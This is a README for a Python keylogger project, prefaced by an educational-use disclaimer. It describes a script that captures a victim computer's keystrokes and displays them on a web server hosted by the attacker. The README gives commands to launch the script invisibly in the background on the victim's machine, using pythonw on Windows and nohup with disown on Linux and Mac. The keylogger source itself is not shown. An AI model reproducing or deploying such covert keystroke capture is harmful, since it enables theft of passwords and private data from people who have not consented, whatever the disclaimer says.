## Disclaimer

This project is intended strictly for **educational use**, **authorized security research**, and **controlled lab environments** only.

Do **not** use this code, techniques, or concepts against systems, networks, accounts, applications, or users without **explicit written permission** from the owner.

The author does **not** encourage, support, or authorize any illegal, unethical, or unauthorized activity. You are solely responsible for how you use any material in this repository.

If you are learning from this project, use it only in:
- personal virtual labs
- CTF platforms
- intentionally vulnerable test environments
- systems you own or are explicitly permitted to assess
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Keylogger
A simple keylogger written in python script which would capture the keystrokes of a victim computer and display it on a webserver hosted by the attacker.

# Keylogger.py

This is the code which should run on the victim's computer.

If Victim's pc is a windows, open cmd and type:
```
pythonw Keylogger.py
```
if it's linux or Mac, type:
```
nohup python keylogger.py & disown
```
Then you can close the window and it'll run on the background 
